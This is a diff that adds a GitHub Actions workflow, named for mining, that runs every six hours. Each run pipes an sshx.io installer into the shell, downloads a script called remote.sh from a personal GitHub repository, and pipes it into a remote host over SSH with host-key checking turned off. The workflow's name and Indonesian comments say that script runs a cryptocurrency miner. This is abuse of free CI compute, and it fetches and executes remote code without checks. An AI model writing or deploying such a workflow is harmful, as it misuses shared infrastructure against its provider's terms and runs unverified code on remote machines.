@@ -1,0 +1,28 @@
+name: sshx-vps-mining
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"  # Jalan otomatis tiap 6 jam
+jobs:
+  mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Connect to SSHX VPS and run remote miner
+        run: |
+          echo "[+] Starting SSHX Tunnel..."
+          curl -sSf https://sshx.io/get | sh -s run > log.txt &
+
+          sleep 10  # Tunggu sshx aktif
+
+          LINK=$(grep -o 'https://sshx.io/[^ ]*' log.txt | head -n1)
+          HOST=$(echo $LINK | cut -d/ -f3)
+          echo "[+] SSHX Link: $LINK"
+
+          # Unduh skrip mining dari GitHub (pastikan kamu upload remote.sh ke repo kamu)
+          curl -sO https://raw.githubusercontent.com/Nsal12/sal/refs/heads/main/remote.sh
+          chmod +x remote.sh
+
+          echo "[+] Menjalankan script mining di VPS via SSH..."
+          ssh -o StrictHostKeyChecking=no -p 2222 sshx@$HOST 'bash -s' < remote.sh
